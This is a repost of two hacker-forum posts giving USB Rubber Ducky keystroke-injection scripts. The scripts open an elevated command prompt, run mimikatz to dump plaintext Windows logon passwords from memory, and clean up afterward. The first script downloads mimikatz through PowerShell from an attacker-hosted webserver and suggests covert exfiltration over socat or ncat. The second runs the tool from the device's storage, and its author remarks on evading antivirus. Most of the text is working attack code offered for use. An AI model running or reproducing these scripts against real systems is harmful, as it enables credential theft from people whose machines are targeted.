The following payload was written by redmeatuk. 

The payload's forum is located here: 

http://forums.hak5.org/index.php?/topic/29657-payload-ducky-script-using-mimikatz-to-dump-passwords-from-memory/

# From this point on is a copy paste of redmeatuk's post in the forum. 
Hello all,

 

This is a Ducky script I knocked up to use the wonderful mimikatz tool. This tool allows you to dump hashes including the clear text passwords for wdigest from memory.

 

http://blog.gentilki...mikatz/minidump

http://www.room362.c...rds-with-a.html

 

Requirements -:

 

- Webserver to host Mimikatz binary for your architecture (I tested this on Windows 7 Home Premium 64-bit) you need the ones in the 'alpha' subfolder of the zip/7z file for your architecture

- Local user needs to be an administrator account/privs

 

What does it do ?

 

1. It spawns a command shell with administrator privileges

2. It downloads mimikatz from a webserver using powershell

3. Using mimikatz to dump wdigest passwords from memory

4. Cleans up by deleting the binaries it downloaded

 

It could be improved by using sneaky data exfil techniques to transfer the data encrypted offsite e.g. socat, ncat SSL, stunnel etc If you have a firmware installed that lets you store files you could copy the output to the SD card. Also mimikatz file could be encoded and run through powershell to generate the executable instead of 'wget'ing' the file.

 

You may need to adjust timings in this script to play nice on your machine(s).

 

Script -:

```
REM mimikatz ducky script to dump local wdigest passwords from memory using mimikatz (local user needs to be an administrator/have admin privs)
DELAY 3000
CONTROL ESCAPE
DELAY 1000
STRING cmd
DELAY 1000
CTRL-SHIFT ENTER
DELAY 1000
ALT y
DELAY 300
ENTER
STRING powershell (new-object System.Net.WebClient).DownloadFile('http://<replace me with webserver ip/host>/mimikatz.exe','%TEMP%\mimikatz.exe')
DELAY 300
ENTER
DELAY 3000
STRING %TEMP%\mimikatz.exe
DELAY 300
ENTER
DELAY 3000
STRING privilege::debug
DELAY 300
ENTER
DELAY 1000
STRING sekurlsa::logonPasswords full
DELAY 300
ENTER
DELAY 1000
STRING exit
DELAY 300
ENTER
DELAY 100
STRING del %TEMP%\mimikatz.exe
DELAY 300
ENTER
```

# Now, a similar payload by shutin using a ducky EXE running script, again copy paste. 

Woo! Finally posting my own working payload! Thanks to overwraith and readmeatuk for their base code that I just tied together. This basically does exactly what readmeatuk's code does except you won't need an internet connection.

Requirements:

1) Twin duck firmware or whatever it's called that lets you have a usb storage as well as firing inject.bin upon insertion.

2) mimikatz.exe (either 32bit or 64 bit depending on target environment) placed at the root of that DUCKY drive (drive name MUST be "DUCKY"). Get it here: http://blog.gentilkiwi.com/mimikatz and use the exe from the "alpha" subdirectory

 

Notes: I tried to do it with procdump but it takes a LONG time to write out the 36meg output file to the card and the window for procdump basically freezes and you have to forcibly kill it. You could probably write the .dmp file to a local disk and then copy it to the ducky but it's still going to take awhile. I don't think that many AV programs are looking for mimikatz so it's fairly safe,.

 

This script could be optimized a little, it's a bit slow and it leaves two windows open. You want to leave the mimikatz window open though because after this f$#%^$ker executes you'll be staring at plaintext passwords for the logged on users!@!$#@
```
REM Author: shutin who just tied two other authors together: 
REM overwraith for the exe running stuff and redmeatuk who brought mimikatz to the party
REM Name: Runmimikatz.txt
DEFAULT_DELAY 75
DELAY 3000
REM get a cmd prompt this way because it's admin and we need that for mimikatz
CONTROL ESCAPE
DELAY 1000
STRING cmd
DELAY 1000
REM the admin part booyah
CTRL-SHIFT ENTER
DELAY 1000
ALT y
DELAY 300
ENTER

REM Change directories because System32 appears to be protected. 
STRING CD %TEMP%
ENTER

REM Make batch file that waits for SD card to mount. 
REM Delete batch file if already exists
STRING erase /Q DuckyWait.bat
ENTER
STRING copy con DuckyWait.bat
ENTER
REM DuckyWait.bat contents
STRING :while1
ENTER
STRING for /f %%d in ('wmic volume get driveletter^, label ^| findstr "DUCKY"') do set myd=%%d
ENTER
STRING if Exist %myd% (
ENTER
STRING goto break
ENTER
STRING )
ENTER
STRING timeout /t 30
ENTER
STRING goto while1
ENTER
STRING :break
ENTER
REM 
REM FINALLY ACTUALLY RUN AN EXE 
STRING START %myd%\mimikatz.exe
ENTER
CONTROL z
ENTER
STRING DuckyWait.bat
ENTER
DELAY 1000
ENTER
DELAY 3000
STRING privilege::debug
DELAY 300
ENTER
DELAY 1000
STRING sekurlsa::logonPasswords full
DELAY 300
ENTER
```